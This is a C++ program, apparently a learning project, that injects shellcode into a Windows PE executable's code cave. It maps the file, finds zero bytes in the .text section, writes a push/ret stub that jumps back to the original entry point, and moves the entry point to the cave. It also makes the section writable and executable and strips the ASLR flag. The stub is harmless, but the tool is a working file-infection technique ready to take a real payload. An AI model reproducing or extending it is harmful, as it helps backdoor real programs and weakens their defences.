#include <Windows.h>
#include <iostream>
#include <vector>
#include "FileMemMapper.h"


#define GetDOSHeader(filep) ((PIMAGE_DOS_HEADER)filep)
#define GetPEHeader(filep) ((PIMAGE_NT_HEADERS)((DWORD)GetDOSHeader(filep) + GetDOSHeader(filep)->e_lfanew))
#define GetFileHeader(filep) ((PIMAGE_FILE_HEADER)&GetPEHeader(filep)->FileHeader)
#define GetOptionalHeader(filep) ((PIMAGE_OPTIONAL_HEADER)&GetPEHeader(filep)->OptionalHeader)
#define GetFirstSectionHeader(filep) ((PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(GetPEHeader(filep)))
#define GetLastSectionHeader(filep) ((PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(filep) + (GetPEHeader(filep)->FileHeader.NumberOfSections - 1)))
#define VerifyDOS(filep) (GetDOSHeader(filep)->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE)
#define VerifyPE(filep) (GetPEHeader(filep)->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE)

unsigned FindCave(const unsigned char* buffer, unsigned buflen, unsigned size) {

	unsigned counter = 0;

	for (unsigned offset = 0; offset < buflen; offset++) {
		if (buffer[offset] == 0) {
			if (counter++ == size) return offset - size;
		}
		else counter = 0;
	}
	return 0;
}


void CheckHeaders(unsigned char* mmapfile) {
	if (!VerifyDOS(mmapfile) || !VerifyPE(mmapfile)) {
		printf("[-] Not a valid executable\n");
		exit(1);
	}
	printf("[+] DOS & PE Headers OK!\n");
}



void getSections(const unsigned char* file, std::vector<PIMAGE_SECTION_HEADER>& vec) {
	for (DWORD i = (DWORD)GetFirstSectionHeader(file); i <= (DWORD)GetLastSectionHeader(file); i += sizeof(IMAGE_SECTION_HEADER)) {
		vec.push_back((PIMAGE_SECTION_HEADER)i);
	}
}
PIMAGE_SECTION_HEADER findSection(unsigned char* file, BYTE name[8]) {
	std::vector<PIMAGE_SECTION_HEADER> s;
	getSections(file, s);

	for (PIMAGE_SECTION_HEADER hdr : s) {
		if (memcmp(name, hdr->Name, 8) == 0) return hdr;
	}
	return 0;

}

unsigned char* getShellcode(unsigned& siz) {
	siz = 6;
	return (unsigned char*)"\x68\xAA\xAA\xAA\xAA\xC3"; //push 0xAAAAAAAA & ret
}



int main() {
	FileMemMapper fmm(L"C:\\Users\\Joshua\\source\\repos\\test\\Release\\test.exe", FILE_READ_ACCESS | FILE_WRITE_ACCESS);
	unsigned char* mmapfile = fmm.MappedFileBase;
	printf("[+] Mapped file to memory (0x%X)\n",(DWORD)mmapfile);
	//Check if file is a valid PE file
	CheckHeaders(mmapfile);

	

	PIMAGE_OPTIONAL_HEADER optionalhdr = GetOptionalHeader(mmapfile);
	PIMAGE_SECTION_HEADER text = findSection(mmapfile,(BYTE*)".text\x00\x00");
	if (text == 0) {
		fprintf(stderr, "Could not find section!\n");
		return 1;
	}

	DWORD oepinfile = optionalhdr->AddressOfEntryPoint - text->VirtualAddress + text->PointerToRawData;
	printf("[+] Entry Point in file @ 0x%X\n", oepinfile);


	unsigned shSize = 0;
	PUCHAR x = getShellcode(shSize);

	//Find Cave
	printf("[+] Payload Size is %d bytes\n",shSize);
	const unsigned cave = FindCave(mmapfile + text->PointerToRawData,text->SizeOfRawData, shSize);
	if (cave == 0) {
		fprintf(stderr, "[-] No CodeCave of size %d\n", shSize);
		return 1;
	}
	printf("[+] CodeCave of size %d found @ offset 0x%X\n", shSize, text->PointerToRawData + cave);




	

	PUCHAR payload = (PUCHAR)malloc(shSize);

	DWORD* placeholder = nullptr;
	if (payload != 0) {
		memcpy_s(payload, shSize, x, shSize);
		for (DWORD i = (DWORD)payload; i < shSize + (DWORD)payload; i++) {
			if (*((DWORD*)i) == 0xAAAAAAAA) {
				placeholder = (DWORD*)i;
				break;
			}
		}
		printf("[+] Payload is:\n");
		for (PUCHAR i = payload; i < (shSize + payload); i++) {
			printf("%X ", *i);
		}
		printf("\n");
	}
	else {
		fprintf(stderr, "[-] Could not allocate memory for payload\n");
		return 1;
	}


	//changes to the file happen here


	printf("Press Enter to continue\n");
	std::cin.get();



	DWORD oep_mem = optionalhdr->AddressOfEntryPoint + optionalhdr->ImageBase; //The oep but in a way we can jmp to after, assuming ASLR of off
	printf("[+] OEP in memory (ASLR off) = 0x%X\n", oep_mem);


	if (placeholder != nullptr) *placeholder = oep_mem;
	else fprintf(stderr, "[-] Could not find a large enough code cave\n");

	printf("[+] Writing payload to cave @ 0x%X\n", cave + text->PointerToRawData);
	memcpy_s(cave + text->PointerToRawData + mmapfile, shSize, payload, shSize);
	text->Misc.VirtualSize += shSize;
	optionalhdr->AddressOfEntryPoint = cave + text->VirtualAddress; // move EP to cave
	text->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	
	//TOTO
	/*
	Lazy approach : disable ASLR in the pe file
	OR: make the payload able to calculate the base address by itself (GetModuleHandleA(0))
	*/

	if (optionalhdr->DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
		optionalhdr->DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		printf("[+] Disabled ASLR\n");
	}

	
	free(payload);
	return 0;
}